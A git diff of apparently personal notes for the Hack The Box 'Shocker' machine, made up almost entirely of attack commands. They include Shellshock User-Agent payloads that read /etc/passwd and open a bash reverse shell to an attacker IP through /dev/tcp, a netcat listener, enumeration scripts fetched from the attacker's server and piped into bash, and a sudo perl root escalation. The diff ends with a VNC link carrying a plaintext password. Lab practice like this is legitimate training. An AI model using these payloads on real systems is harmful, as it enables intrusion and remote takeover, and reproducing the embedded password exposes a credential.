@@ -37,15 +37,18 @@ cat shocker-script
 http://10.10.10.56/cgi-bin/user.sh
 
 
-nc -lvnp 1234
+
 
 
 User-Agent: () { :;}; echo; /bin/bash -c 'cat /etc/passwd'
 
 
 sudo tcpdump -i tun0 icmp
+
 User-Agent: () { :;}; echo; /bin/bash -c 'ping 10.10.14.24 -c 4'
 
+
+nc -lvnp 1234
 
 User-Agent: () { :; }; echo; /bin/bash -i >& /dev/tcp/10.10.14.24/1234 0>&1
 
@@ -56,9 +59,14 @@ python3 -c "import pty;pty.spawn('/bin/bash')"
 
 cd ~/htb/enum
 ./start-pythonwebserver.sh
-#sudo python3 -m http.server 8888
+
+sudo python3 -m http.server 8888
 
 curl http://10.10.14.24:8888/LinEnum.sh | bash
+
+curl http://10.10.14.24:8888/linpeas.sh | bash
+
+
 
 sudo -l
 
@@ -67,3 +75,7 @@ sudo perl -e 'system ("/bin/bash")'
 id
 
 cat /root/root.txt
+
+
+
+https://vnc.htb-cloud.com/index.html?host=proxy-de.htb-cloud.com%2Fbird%2Fhtb-nfvqowfxtw.htb-cloud.com&password=Y4DtyoK9&view_only=true
